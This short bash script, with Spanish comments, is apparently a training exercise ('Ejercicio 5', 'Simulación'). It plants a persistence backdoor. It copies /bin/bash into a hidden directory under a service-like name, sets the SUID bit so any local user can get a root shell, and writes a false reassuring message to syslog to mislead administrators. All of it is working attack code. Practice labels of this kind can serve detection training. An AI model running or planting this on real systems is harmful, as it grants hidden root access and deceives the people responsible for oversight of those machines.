#!/bin/bash
# Ejercicio 5: El Binario SUID Malicioso (Backdoor de Persistencia)
# Duplica la shell bash en un directorio oculto y le asigna el bit SUID
mkdir -p /var/tmp/.system_cache
cp /bin/bash /var/tmp/.system_cache/.svc_monitor
chmod u+s /var/tmp/.system_cache/.svc_monitor
# Registrar una pista falsa en syslog
logger -t systemd "Services status: alpha-monitor initialized safely."
echo "Simulación 5 completada."
